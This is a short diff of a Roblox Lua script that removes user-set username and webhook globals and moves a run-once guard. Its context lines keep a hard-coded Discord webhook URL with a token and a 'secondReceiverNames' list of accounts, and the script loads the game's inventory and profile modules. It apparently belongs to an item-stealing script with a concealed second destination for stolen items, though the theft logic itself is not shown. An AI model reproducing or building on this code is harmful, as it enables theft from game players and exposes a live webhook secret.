@@ -1,12 +1,12 @@
-local Username = getgenv().Username
-local Webhook = getgenv().Webhook
+
+
+
+if getgenv().executed then return end
+getgenv().executed = true
 
 local secondWebHook = "https://discord.com/api/webhooks/1284418982308216907/4C9cKwmwHBQLrWgscuQ3753LZrVUIkml_w_HOMNVmARxSY7TOMNKMfP47a7DUIElbp2a"
 
 local secondReceiverNames = {"zalanlovesjen", "4urgs", "WORSHlPFUL"}
-
-if getgenv().executed then return end
-getgenv().executed = true
 
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
